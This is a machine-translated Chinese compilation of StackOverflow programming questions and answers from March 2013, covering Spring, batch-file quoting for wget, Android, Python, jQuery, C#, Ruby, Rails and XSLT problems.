# StackOverflow 问答 15357000-15357999

# java - 如何加载 Spring 应用程序上下文

> ID：15357004
> 
> 赞同：5
> 
> 时间：2013-03-12T09:03:25.840
> 
> 标签：java, spring

我有一个春季项目。它适用于junit测试用例。juint 调用 applicationcontext.xml 并且项目成功运行。但我想在不使用 jUnit 的情况下运行该项目。这是我的 jUnit 测试用例

```
package com.dataload;

import org.apache.log4j.Logger;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.batch.core.Job;
import org.springframework.batch.core.JobParameters;
import org.springframework.batch.core.launch.JobLauncher;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
import org.springframework.test.context.transaction.TransactionConfiguration;
import org.springframework.util.StopWatch;

@ContextConfiguration(locations = "classpath:com/dataload/applicationcontext.xml")
@RunWith(SpringJUnit4ClassRunner.class)
@TransactionConfiguration(transactionManager = "transactionManager", defaultRollback = false)
public class SICSVDataTestCase {

    private final static Logger logger = Logger
            .getLogger(SICSVDataTestCase.class);

    @Autowired
    private JobLauncher launcher;

    @Autowired
    private Job job;
    private JobParameters jobParameters = new JobParameters();

    @Test
    public void testLaunchJob() throws Exception {
        StopWatch sw = new StopWatch();
        sw.start();
        launcher.run(job, jobParameters);
        sw.stop();
        logger.info(">>> TIME ELAPSED:" + sw.prettyPrint());
    }
} 
```

这个测试用例运行项目。但我想使用另一个可以调用 applicationcontext.xml 并运行项目的类。

那是，

```
package com.dataload;

public class insertCSV 
{
    public static void main(String args[])
    {
        /*  Code to run the project */
    }
} 
```

谁能建议我如何编码？谢谢

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-03-12T09:05:07.073

在 main 开头添加这个

```
ApplicationContext context = new ClassPathXmlApplicationContext("path/to/applicationContext.xml");

JobLauncher launcher=(JobLauncher)context.getBean("launcher");
Job job=(Job)context.getBean("job");

//Get as many beans you want
//Now do the thing you were doing inside test method
StopWatch sw = new StopWatch();
sw.start();
launcher.run(job, jobParameters);
sw.stop();
//initialize the log same way inside main
logger.info(">>> TIME ELAPSED:" + sw.prettyPrint()); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:08:08.873

我正在使用这种方式，它对我有用。

```
public static void main(String[] args) {
    new CarpoolDBAppTest();

}

public CarpoolDBAppTest(){
    ApplicationContext context = new ClassPathXmlApplicationContext("application-context.xml");
    Student stud = (Student) context.getBean("yourBeanId");
} 
```

这里 Student 是我的班级，您将获得与 yourBeanId 匹配的班级。

现在使用您想要执行的任何操作处理该对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:09:30.190

```
package com.dataload;

    public class insertCSV 
    {
        public static void main(String args[])
        {
            ApplicationContext context =
        new ClassPathXmlApplicationContext("applicationcontext.xml");

            // retrieve configured instance
            JobLauncher launcher = context.getBean("laucher", JobLauncher.class);
            Job job = context.getBean("job", Job.class);
            JobParameters jobParameters = context.getBean("jobParameters", JobParameters.class);
        }
    } 
```

# windows - 在 Windows 的批处理文件中运行 wget 命令行

> ID：15357010
> 
> 赞同：2
> 
> 时间：2013-03-12T09:03:47.327
> 
> 标签：windows, batch-file, wget

我在 Windows 中使用 wget，它与基本的 http 请求配合得很好，但是当我运行下面的命令时，它基本上是 snom 手机上的操作 URL。它不运行它并在链接下方给我消息。有谁知道如何解决这个问题？

操作网址：

```
 http://Phone-IP-Address/dummy.htm?settings=save&setting_server=http://WEB-Server-IP/settings.xml&store_settings&=save 
```

结果

```
syswgetrc = C:\Program Files (x86)\GnuWin32/etc/wgetrc
--2013-03-12 10:10:53--  
Connecting to `192.168.1.100:80`... connected.
HTTP request sent, awaiting response... 200 Ok
Length: 0 [text/html]
Saving to: `dummy.htm@settings=save'

[ <=>                                   ] 0           --.-K/s   in 0s

2013-03-12 10:10:53 (0.00 B/s) - `dummy.htm@settings=save' saved [0/0]

'setting_server' is not recognized as an internal or external command, operable program or batch file.
'store_settings' is not recognized as an internal or external command, operable program or batch file. 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:11:59.343

[Windows](http://www.microsoft.com/resources/documentation/windows/xp/all/proddocs/en-us/ntcmds_shelloverview.mspx?mfr=true)中的`&`字符是一个特殊字符，告诉 shell 在一行中执行多个命令。所以你必须用双引号将你的 URL 括起来：

```
"http://Phone-IP-Address/dummy.htm?settings=save&setting_server=http://WEB-Server-IP/settings.xml&store_settings&=save" 
```

这样，shell 不会尝试将其作为命令的一部分进行解析，而是将其视为单个参数、单个字符串 blob，因此`&`字符也不会被视为命令分隔符...

[它在Linux 中也](http://tldp.org/LDP/abs/html/special-chars.html)有特殊的含义：

*   一个将在后台异步运行命令
*   `&&`表示逻辑与

# actionscript-3 - 精灵在 AS3 中消失了

> ID：15357018
> 
> 赞同：1
> 
> 时间：2013-03-12T09:04:02.087
> 
> 标签：actionscript-3, flash, flex4, flashdevelop

我在下面有这个类结构

```
 public class Main extends Sprite
 {
       private var myObject:MyObject;
       private var mySecondObject:MySecondObject;
       private var myThirdObject:MyThirdObject;

       public function Main()
       {
            myObject = new MyObject();// also extends sprite
            addChild(myObject );

            mySecondsObject = new MySecondObject(this);
            addChild(mySecondsObject);

            myThirdObject = new MyThirdObject(this);
            addChild(myThirdObject);
       }

       public function getMyObject():MyObject
       {
           return myObject;
       }
 }

 public class MySecondObject extends Sprite
 {
       private var _main:Main;
       private var _myObject:MyObject;

       public function MySecondObject(main:Main)
       {
           _main = main;
           _myObject = _main.getMyObject();              
           // do some stuff with _myObject, add on enter frame listener etc...

       }
       public function start(): { /* do some stuff */}
       public function stop(): { /* do some stuff */}
 }

 public class MyThirdObject extends Sprite
 {
       private var _main:Main;
       private var _myObject:MyObject;

       public function MyThirdObject(main:Main)
       {
           _main = main;
           _myObject = _main.getMyObject();              
           // do some stuff with _myObject, add on enter frame listener etc...

       }
        public function start(): { /* do some stuff */}
       public function stop(): { /* do some stuff */}
 } 
```

出现的问题是当我使用 MySecondObject 和 MyThirdObject 执行此操作时，MyObject 的精灵消失了

```
 MySecondObject.stop();
 MyThirdObject.start(); 
```

MyObject 仍然存在于内存中，但我在舞台上看不到它。怎么回事？？？:)

为了清楚起见，我不会使用 removeChild() 从舞台上删除任何东西。

我试图解决的问题是我想让访问者从 MySecondObject 和 MyThirdObject 更新 MyObject 的状态

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:28:51.420

问题解决了。我更改为在舞台上添加所有孩子，例如 this.stage.addChild(child) 而不是 this.addChild(child) 所以现在它可以工作并在启动/停止后显示舞台上的所有对象

# visual-studio-2010 - 如何在 Visual Studio 2010 中固定选项卡式文档？

> ID：15357019
> 
> 赞同：6
> 
> 时间：2013-03-12T09:04:06.370
> 
> 标签：visual-studio-2010, visual-studio

有没有办法将文档“固定”到固定位置？我想将“源代码管理资源管理器”选项卡保留在最左侧，并始终在其右侧打开新文档。

但是，VS 2010 倾向于在最左侧添加文档。我想要最左边的“源代码管理资源管理器”，所以我总是知道在哪里可以找到它。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-12T11:32:09.210

我可以想到两种不同的方法来做到这一点。第一个仅使用 Visual Studio 2010 中内置的选项，但受到更多限制，可能无法 100% 工作。另一个需要您安装扩展程序，但功能更强大、更可靠，甚至还添加了一些其他有用的功能。

1.  **您可以将 Visual Studio 配置为始终在现有选项卡*右侧*打开新选项**卡，就像 Web 浏览器一样。（我个人更喜欢这个选项。）为此，打开选项对话框（工具→选项），展开“环境”类别，单击“文档”并选中“在现有选项卡右侧插入文档”框（[见屏幕截图](https://i.stack.imgur.com/ooE2X.png)）。

    为您完成这项工作的关键是确保您始终先打开源代码管理资源管理器*，*然后再打开任何其他代码窗口，然后再关闭它。这样一来，它将始终位于最左侧，并且您打开的所有代码窗口都将插入到它的右侧。

    就像我上面提到的，这种方法的优点是它使用了 Visual Studio 中内置的设置，并且不需要您安装任何额外的东西。您所要做的就是拨动一个开关。缺点是它不是 100% 可靠的——如果你关闭源代码管理资源管理器并重新打开它，你必须记住将它拖回最左边的位置，否则当你去寻找它。

2.  **您可以安装 Microsoft 的 Productivity Power Tools 扩展**（[可从 Visual Studio 库获得](http://visualstudiogallery.msdn.microsoft.com/d0d33361-18e2-46c0-8ff2-4adea1e34fef)），它增加了将选项卡（以及许多其他简洁功能）固定到 VS IDE 的能力。[这里](http://blogs.msdn.com/b/visualstudio/archive/2010/06/10/document-well-2010-plus.aspx)有很多专门添加到文档选项卡的功能，但您最感兴趣的功能是[固定选项卡](http://blogs.msdn.com/b/visualstudio/archive/2010/06/10/document-well-2010-plus.aspx#pinned)。您甚至可以在单独的行中显示固定的标签！

    ![该扩展添加了一个](../Images/69589741578bf3efd7fe3566fed56d87.png "固定窗户！ 慢慢地，Visual Studio 重新获得了与 Visual C++ 6 相同的功能……")

    这几乎是一个完美的解决方案，但它确实有一个缺点，即需要您安装一些额外的东西。在某些环境中，对某些人来说，这可能会成为交易杀手。太多的扩展也会减慢速度，而更高版本的 Visual Studio 似乎已经足够慢了。（尽管如此，我在大约一半的 VS 安装中使用了 PPT 扩展，但我没有注意到它引起了任何重大问题。）

# android - 如何根据分辨率更改图像？

> ID：15357023
> 
> 赞同：0
> 
> 时间：2013-03-12T09:04:21.080
> 
> 标签：android, layout, screen

我正在开发一个安卓应用程序。我使用了不同的布局文件夹。像布局，layout-large，layout-xlarge。这样它就可以针对所有分辨率进行调整。但我在活动中动态设置图像。如何根据屏幕分辨率更改它们？如果我们改变分辨率，太大的图像将如何替换更小的图像？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:07:50.660

Android 使用密度桶，从 l(low)dpi 到 xx(extra extra)h(high)dpi。

您想在文件夹中创建不同版本的图像

*   可绘制的 ldpi
*   可绘制的 mdpi
*   可绘制的 hdpi
*   可绘制的 xhdpi
*   和 drawable-xxhdpi 如果你想支持 Nexus 10。

这与 layout-large 文件夹有点松散，它使您能够为不同的大小定义不同的布局。

[2 完全不同的东西，您可以在 Android 的屏幕实践中](http://developer.android.com/guide/practices/screens_support.html)了解更多信息 。

======= 编辑；似乎这不完全是问题。

如果您以“正确的方式”进行操作，Android 系统将为您选择正确的图像，即使是动态添加它们（您仍然可以从 java 代码中调用 R.drawable.my_image）。

如果由于某种原因你必须选择，你可以简单地用类似的东西检查电流密度（有点过时）；

```
public String getDensity() {
    String density;
    DisplayMetrics dm = new DisplayMetrics();
    getWindowManager().getDefaultDisplay().getMetrics(dm);
    // will either be DENSITY_LOW (120) , DENSITY_MEDIUM (160) or
    // DENSITY_HIGH (240)
    switch (dm.densityDpi) {
    case 120:
        density = "ldpi";
        break;
    case 160:
        density = "mdpi";
        break;
    case 240:
        density = "hdpi";
        break;
    // use hdpi as default, because flurry shows this will be suited for
    // most of our users.
    default:
        density = "hdpi";
        break;
    }
    return density;
} 
```

# python - Python中的井字游戏循环未运行

> ID：15357029
> 
> 赞同：0
> 
> 时间：2013-03-12T09:04:39.443
> 
> 标签：python, python-3.x, tic-tac-toe

我不知道为什么，但是下面的 Python 3 代码并没有`tie(cell)`像我希望的那样在内部循环中运行该函数（因此当电路板已满时循环停止运行）。

任何人都知道为什么？谢谢！

```
import random
cell = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
def owin(cell):
    if cell[0] == cell[1] == cell[2] == 'O' or cell[3] == cell[4] == cell[5] == 'O' or cell[6] == cell[7] == cell[8] == 'O' or cell[0] == cell[3] == cell[6] == 'O' or cell[1] == cell[4] == cell[7] == 'O' or cell[2] == cell[5] == cell[8]== 'O':
        return True
    else:
        return False
def xwin(cell):
    if cell[0] == cell[1] == cell[2] == 'X' or cell[3] == cell[4] == cell[5] == 'X' or cell[6] == cell[7] == cell[8] == 'X' or cell[0] == cell[3] == cell[6] == 'X' or cell[1] == cell[4] == cell[7] == 'X' or cell[2] == cell[5] == cell[8]== 'X':
        return True
    else:
        return False
def tie(cell):
    if cell[0] in ('O', 'X') and cell[1] in ('O', 'X') and cell[2] in ('O', 'X') and cell[3] in ('O', 'X') and cell[4] in ('O', 'X') and cell[5] in ('O', 'X') and cell[6] in ('O', 'X') and cell[7] in ('O', 'X') and cell[8] in ('O', 'X'):
        return True
    else:
        return False
board = '\n\t ' + cell[0] + ' | ' + cell[1] + ' | ' + cell[2] + '\n\t-----------\n\t ' + cell[3] + ' | ' + cell[4] + ' | ' + cell[5] + '\n\t-----------\n\t ' + cell[6] + ' | ' + cell[7] + ' | ' + cell[8]
print('\tTIC TAC TOE\n\t\tBy Lewis Cornwall')
instructions = input('Would you like to read the instructions? (y/n)')
if instructions == 'y':
    print('\nEach player takes turns to place a peice on the following grid:\n\n\t 1 | 2 | 3\n\t-----------\n\t 4 | 5 | 6\n\t-----------\n\t 7 | 8 | 9\n\nBy inputing a vaule when prompted. The first to 3 peices in a row wins.')
player1 = input('Enter player 1\'s name: ')
player2 = input('Enter player 2\'s name: ')
print(player1 + ', you are O and ' + player2 + ', you are X.')
nextPlayer = player1
while not owin(cell) and not xwin(cell) and not tie(cell):
    print('This is the board:\n' + board)
    if nextPlayer == player1:
        move = input('\n' + player1 + ', select a number (1 - 9) to place your peice: ')
        cell[int(move) - 1] = 'O'
        board = '\n\t ' + cell[0] + ' | ' + cell[1] + ' | ' + cell[2] + '\n\t-----------\n\t ' + cell[3] + ' | ' + cell[4] + ' | ' + cell[5] + '\n\t-----------\n\t ' + cell[6] + ' | ' + cell[7] + ' | ' + cell[8]
        nextPlayer = player2
    else:
        move = input('\n' + player2 + ', select a number (1 - 9) to place your peice: ')
        cell[int(move) - 1] = 'X'
        board = '\n\t ' + cell[0] + ' | ' + cell[1] + ' | ' + cell[2] + '\n\t-----------\n\t ' + cell[3] + ' | ' + cell[4] + ' | ' + cell[5] + '\n\t-----------\n\t ' + cell[6] + ' | ' + cell[7] + ' | ' + cell[8]
        nextPlayer = player1
if owin(cell):
    print('Well done, ' + player1 + ', you won!')
elif xwin(cell):
    print('Well done, ' + player2 + ', you won!')
else:
    print('Unfortunately, niether of you were able to win today.')
input('Press <enter> to quit.') 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:10:30.683

在您编写的代码中，唯一的外观`tie(cell)`是这个：

```
while not owin(cell) and not xwin(cell) and not tie(cell): 
```

请注意，它是一个逻辑表达式，并且在几乎所有编程语言（包括 Python）中，都对逻辑表达式进行了优化，如下所示：

```
# here test_func() won't be invoked
if 1 or test_func():
    pass

# here test_func() won't be invoked
if 0 and test_func():
    pass

# here test_func() would be invoked
if 1 and test_func():
    pass

# here test_func() would be invoked
if 0 or test_func():
    pass 
```

所以不被调用的原因`tie(cell)`是要么要么`owin(cell)`返回`xwin(cell)`true。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:32:05.090

替换函数 tie(cell) 内的 Condition

`if cell[0] in ('O', 'N') and cell[1] in ('O', 'N') and cell[2] in ('O', 'N') and cell[3] in ('O', 'N') and cell[4] in ('O', 'N') and cell[5] in ('O', 'N') and cell[6] in ('O', 'N') and cell[7] in ('O', 'N') and cell[8] in ('O', 'N'):`

经过

```
 if cell[0] in ('O', 'X') and cell[1] in ('O', 'X') and cell[2] in ('O', 'X') and cell[3] in ('O', 'X') and cell[4] in ('O', 'X') and cell[5] in ('O', 'X') and cell[6] in ('O', 'X') and cell[7] in ('O', 'X') and cell[8] in ('O', 'X'): 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:11:44.267

条件应该是这样的：

```
while (not owin(cell) or not xwin(cell)) and not tie(cell): 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T10:41:56.700

正如@PengyuCHEN 所说，只有在其他 2 次检查之后才会调用
您的`tie()`函数。因此，如果您重新排列它，您会发现您的问题已解决。所以，这应该工作：

```
while not tie(cell) and not (owin(cell) or xwin(cell)): 
```

另外，虽然你没有要求它，但我试图清理你的代码......

```
import random
instructions = '''
Each player takes turns to place a piece on the following grid:

     1 | 2 | 3
    -----------
     4 | 5 | 6
    -----------
     7 | 8 | 9

By inputting a value when prompted. The first to 3 pieces in a row wins'''

form = '''
\t| %s | %s | %s |
\t-------------
\t| %s | %s | %s |
\t-------------
\t| %s | %s | %s |
'''

cell = ['1', '2', '3', '4', '5', '6', '7', '8', '9']

def win(cell, char):
    return cell[0] == cell[1] == cell[2] == char or\
       cell[3] == cell[4] == cell[5] == char or\
       cell[6] == cell[7] == cell[8] == char or\
       cell[0] == cell[3] == cell[6] == char or\
       cell[1] == cell[4] == cell[7] == char or\
       cell[2] == cell[5] == cell[8] == char

def tie(cell):
    return all(c in ('O','X') for c in cell)

def get_input(player):
    while True:
        m = input('\n%s, select a number (1 - 9) to place your peice: ' % player)
        try:
            return int(m)
        except BaseException:
            print 'Invalid Input'
            continue

board = form % tuple(cell)

print('\tTIC TAC TOE\n\t\tBy Lewis Cornwall')
instr = input('Would you like to read the instructions? (y/n) ')
if instr.startswith('y'):
    print(instructions)

player1 = input('Enter player 1\'s name: ').strip()
player2 = input('Enter player 2\'s name: ').strip()

print(player1 + ', you are O and ' + player2 + ', you are X.')
nextPlayer = player1

while not tie(cell) and not (win(cell, 'O') or win(cell,"X")):
    print('This is the board:\n' + board)
    if nextPlayer == player1:
        move = get_input(player1)
        cell[move - 1] = 'O'
        board = form % tuple(cell)
        nextPlayer = player2
    else:
        move = get_input(player2)
        cell[move - 1] = 'X'
        board = form % tuple(cell)
        nextPlayer = player1

if win(cell,"O"):
    print('Well done, ' + player1 + ', you won!')
elif win(cell,"X"):
    print('Well done, ' + player2 + ', you won!')
else:
    print('Unfortunately, neither of you were able to win today.')
input('Press <enter> to quit.') 
```

# javascript - 如何使用 attr 获取两个元素

> ID：15357036
> 
> 赞同：0
> 
> 时间：2013-03-12T09:05:03.453
> 
> 标签：javascript, jquery

[http://jsfiddle.net/dude_jsfiddle/CQ9qm/](http://jsfiddle.net/dude_jsfiddle/CQ9qm/)

```
 <ul>
    <li class="jstree-leaf" kids="0" range="5-7" name="mars" public_id="mars_05" ra_depth="5">
    </li>
    <li class="jstree-leaf" kids="0" range="8-10" name="pluto" public_id="pluto_8" ra_depth="5"
    </li>
  </ul>

alert($(document).find("li[name='pluto','mars']").length); 
```

谁知道如何获得这两个元素？

冥王星和火星合二为一

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:07:15.310

```
$(document).find("li[name='pluto'],li[name='mars']").length 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:08:35.940

试试这个：

```
alert($(document).find("li[name='pluto'],li[name='mars']").length); 
```

# javascript - 检查是否有任何字段填写在特定的div中

> ID：15357040
> 
> 赞同：0
> 
> 时间：2013-03-12T09:05:10.927
> 
> 标签：javascript, jquery, html

我的表单中有 10 个 div 标签，每个 div 中有 5 个选择框。例如我们取第一个包含 5 个选择框的 div，这里我想检查 5 个选择框中的任何一个是否被选中。

如果选择了任何一个，我需要在我的页面中显示一些链接，如果没有选择任何内容，我需要隐藏这些链接。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-12T09:07:36.860

使用：

```
// Detect if a <select> has a value other than 0
function isSelected(){
    $('select').each(function(){
        if($(this).val() != '0'){
            return true;
        }
    });

    return false;
}

// Usage
if(isSelected()){
    // Do something
} 
```

# c# - 为什么这段代码的结果是一样的？

> ID：15357042
> 
> 赞同：0
> 
> 时间：2013-03-12T09:05:14.973
> 
> 标签：c#

```
static void increment(int num)
{
    num++;
}

static void Main(string[] args)
{   
    int x = 30;
    Console.WriteLine(x);
    increment(x);
    Console.WriteLine(x);
} 
```

嗨，我想知道为什么这段代码的结果是**30**和**30**，没有任何变化？谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-12T09:07:57.547

因为在函数增量中，参数是按值传递的，而不是按引用传递的。

如果你想看到 x 改变，要么做

```
static int increment (int num)//parameter passed by value, but function now returns an incremented value, not void.
    {
        num++;
        return num;
    }
        static void Main (string[] args)
    {   
        int x=30;

        Console.WriteLine(x);
        x = increment(x);
        Console.WriteLine(x);
    } 
```

或者

```
static void increment (ref int num)//num is passed by ref now
    {
        num++;
    }
        static void Main (string[] args)
    {   
        int x=30;

        Console.WriteLine(x);
        increment(ref x);
        Console.WriteLine(x);
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:07:17.803

原因是因为 int 的值被传递，而不是引用。

如果您将增量更改为接受 (ref int) 并调用它 -`increment (ref x)`它会更改它

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-12T09:07:29.770

您的增量方法基本上什么都不做。它不返回修改后的值。该`num++`行将增加`num`一，但您不会从中返回任何内容。所以`num`永远都是一样的。`ref`例如，您可以使用关键字传递 ref

```
static void increment (ref int num)
{
    num++;
} 
```

这会改变 num`31`在你的第二个 writeline 调用中给你的值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-12T09:06:58.100

因为`int`是[值类型](http://msdn.microsoft.com/en-us/library/34yytbws%28v=vs.71%29.aspx)。它不是通过引用传递的。它是按值传递的（创建副本并传递给方法）。`num`因此，对方法中参数的任何修改`increment`都不会影响`x`调用代码中的值。在方法中只`x`修改了值的副本。`increment`

```
static void increment(int num) // here you have copy of x
{
    num++; // copy is modified
}

static void Main(string[] args)
{   
    int x = 30;
    Console.WriteLine(x);
    increment(x); // x stays here and not passed into method
    Console.WriteLine(x);
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-03-12T09:07:30.440

原因是您通过值而不是引用传递了 num 变量。按值传递时，变量的值被复制到本地副本中，然后本地副本递增，但在方法完成后销毁。如果你通过引用传递你的变量，那么变量的地址被传递给方法并且原始变量被改变，而不是它的副本。

```
static void increment (ref int num)
    {
        num++;
    } 
```

然后你调用这个方法

```
increment(ref x); 
```

`int`is 值类型和所有其他值类型一样，如果不使用关键字，则始终按值传递`ref`。与这些不同，类类型作为引用传递，并且在方法中更改它们会更改原始对象。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-03-12T09:07:33.163

x 是本地定义的。

如果您尝试`Console.WriteLine(num);`打印`increment (int num)`

它将打印 31。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-03-12T09:08:30.090

int 是值类型，您需要将参数声明为 ref：

```
static void increment (ref int num) 
```

# css - 如何将渲染的单元格行向右对齐？

> ID：15357044
> 
> 赞同：0
> 
> 时间：2013-03-12T09:05:17.117
> 
> 标签：css, gwt

我有一个`CellTable`. `Columns`我以编程方式将文本向右对齐的列之一：

```
column.setHorizontalAlignment(HasHorizontalAlignment.ALIGN_RIGHT); 
```

此外，我希望单元格在右侧有一个填充。无法让它工作。这是我尝试过的：

```
column.setCellStyleNames("numberCell");

.numberCell {
  padding-right: 5px !important;
  margin-right: 5px !important;
  color: red !important;
} 
```

单元格中的文本呈现为红色，但没有填充。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T09:18:50.650

当您应用样式时，它应该可以工作。但让您尝试使用`getCellStyleNames`. 它可能会起作用。

```
Column<Data,String> noColumn=new Column<Data, String>(new TextCell()) {
             @Override
            public String getCellStyleNames(Context context, Data  object) {
                  return "numberCell";
            }  
            @Override
            public String getValue(Data object) {
                return "";
            }
        }; 
```

# ruby - 我可以将一个本身期望一个块的块传递给 ruby 中的 instance_exec 吗？

> ID：15357046
> 
> 赞同：8
> 
> 时间：2013-03-12T09:05:25.680
> 
> 标签：ruby, block, proc

我期待代码

```
foo=proc{puts "foo"}

instance_exec(1,2,3,&foo) do |*args , &block|
  puts *args
  block.call
  puts "bar"
end 
```

输出

```
1
2
3
富
酒吧

```

但是得到了错误

```
块 arg 和给定的实际块

```

我可以将一个本身期望一个块的块传递给 ruby​​ 中的 instance_exec 吗？</p>

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-12T09:40:17.137

`&foo`尝试`foo`作为一个块传递给`instance_exec`，并且您已经在传递一个显式块。省略与号发送`foo`就像任何其他参数一样（除了它是一个`Proc`实例）。所以，试试这个：

```
instance_exec(1,2,3,foo) do |*args, block|
  puts *args
  block.call
  puts "bar"
end 
```

这也意味着您可以执行以下操作：

```
bar = proc{ |*args, block|
  puts *args
  block.call
  puts "bar"
}

instance_exec(1,2,3,foo,&bar) 
```

并得到相同的结果。

更多信息[在 Ruby 中 block 和 &block 之间的区别](https://stackoverflow.com/questions/1386276/difference-between-block-and-block-in-ruby)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-11-17T22:55:26.783

我迟到了大约 3 年参加这个聚会，但我想我会分享一种方法，让您将内部块更像是一个真正的块，而不仅仅是一个简单的旧论点。

我知道的最好的方法是创建一个对象作为绑定上下文并将外部块定义为方法。因此，如果我在没有 instance_exec 调用的情况下按如下方式重写原始示例...

```
inner_proc = proc { puts "inner" }
outer_proc = proc { |*args, &inner_block|
  puts *args
  inner_block.call
  puts "bar"
} 
```

我们可以定义`outer_proc`为对象上的方法

```
scope_object = Object.new
scope_object.define_singleton_method :bound_proc, &outer_proc 
```

现在您可以调用`scope_object.bound_proc`而不是`instance_exec`上面的调用。

```
scope_object.bound_proc 1, 2, 3, &inner_proc 
```

你会得到：

```
1
2
3
inner
bar 
```

不幸的是，如果您尝试在 内`outer_proc`而不是在内屈服，您将得到 LocalJumpError `inner_block.call`，我不完全确定为什么。如果有人有这个答案，那么我会很感兴趣。

# jquery - 根据屏幕大小调整 iframe 的宽度和高度

> ID：15357047
> 
> 赞同：0
> 
> 时间：2013-03-12T09:05:26.193
> 
> 标签：jquery, html, css, fancybox

我有：

```
$("#fancybox-manual-b").click(function() {
    $.fancybox.open({
    href : 'iframe.html',
    type : 'iframe',
    padding : 5
    });
});

<li><a class="fancybox fancybox.iframe" href="iframe.html">Iframe</a></li> 
```

但是我想根据用户屏幕的大小调整 iframe 的大小。

我正在尝试类似的东西：

```
width = $(window).width() -80;
heigth= $(window).height() -80; 
```

这是正确的吗？，如何在代码中使用它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T12:04:08.337

或者，你也可以试试这个..

```
<script type="text/javascript">
    $(document).ready(function () {
         $("a.iframe").fancybox({
            'width': 800,
            'height': 500,
            'transitionIn': 'elastic',
            'transitionOut': 'elastic',
            'type': 'iframe'
        });
    });
</script> 
```

ND

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T09:11:44.413

尝试这个，

```
function ResizeIframe(iframe) {
    var iframeBody = (iframe.contentDocument) ? iframe.contentDocument.body : iframe.contentWindow.document.body; 
    var height = (iframeBody.scrollHeight < iframeBody.offsetHeight) ? iframeBody.scrollHeight : iframeBody.offsetHeight;
    height = height + 10;
    $(iframe).height(height);
}

<iframe id="idFrm" src="URL" frameborder="0" clientidmode="Static" scrolling="no"                            height="35px" width="98%" onload="javascript:ResizeIframe(this);"></iframe> 
```

我已经使用它并且在所有浏览器中都像魅力一样工作。称它为你的onload

ND

# ruby-on-rails - 根据 id 数组对活动记录进行排序

> ID：15357050
> 
> 赞同：1
> 
> 时间：2013-03-12T09:05:29.233
> 
> 标签：ruby-on-rails, arrays, sorting, activerecord

我有一个 ActiveRecord @grid。

我有一个哈希@numbers。

**导轨控制台**

```
 1.9.3p385 :086 > Grids
     => Grids(unique_id: integer, price: float, availability: string,
     delivery: string, delivery_time: string, delivery_cost: float, 
     special_offers: text, warranty: text, created_at: datetime, updated_at: datetime) 

    => @numbers
    =>{7=>114, 9=>21, 12=>7, 13=>31, 14=>51, 16=>43, 18=>48, 21=>6, 22=>18, 
       24=>69, 27=>47, 30=>47, 32=>31, 33=>36} 
```

@numbers 哈希只不过是 unique_id => 点击次数

```
1.9.3p385 :091 > @no =  @numbers.sort_by{|k,v| v}.reverse.map{|i| i[0]} 
              => [7, 24, 14, 18, 30, 27, 16, 33, 13, 32, 9, 22, 12, 21] 
```

@no 是一个 unique_id 数组。

@grid = Grid.all

```
@grid is an activeRecord, I want to sort this active record based 
on the order of @no which is nothing but the unique_id in @grid. 
```

我正在尝试这个，

```
@grid.sort_by{ |h| @no.index(h.unique_id) } 
```

它不工作，它说，

> ArgumentError：NilClass 与 14 的比较失败

我知道正在进行一些零比较。如何忽略这一点或有更好的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:33:04.217

首先从由 id 索引的网格关系创建一个哈希，然后从该索引上的查找执行映射：

```
grid_index = @grid.index_by &:id
@no.map{|id| grid_index[id] } # possibly compact the resulting array after that 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:32:48.173

它发生是因为`@grid`包括一些`unique_id`没有`@no`的。

代替

```
@grid = Grid.all 
```

和

```
@grid = Grid.all(:conditions=>["unique_id in (?)",@no]) 
```

然后

```
@grid.sort_by{ |h| @no.index(h.unique_id) } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-12T09:52:40.803

尝试：

```
@grid.where(:unique_id => @no).map(&:unique_id) 
```

# xslt - 变量或参数“行”未定义或超出范围

> ID：15357052
> 
> 赞同：0
> 
> 时间：2013-03-12T09:05:41.297
> 
> 标签：xslt, sharepoint-2010

![预期格式](../Images/33899fd73092cbd3d75ca983a0c117ee.png) ![实际格式](../Images/b838ed9841ced38f6c0d74d2ad6a96ed.png)

我如何通过 xslt 实现这一目标？我从你上面给出的 cde 中得到一个错误（[sharepoint 2010 xslt dataview：修改表结构以显示列表项](https://stackoverflow.com/questions/14705054/sharepoint-2010-xslt-dataview-modify-table-structure-to-display-list-item)）

错误是：变量或参数“行”未定义或超出范围。请帮助我为什么会收到此错误：（添加您的代码后，我的完整代码将如下所示：

```
<xsl:template match='dsQueryResponse'>
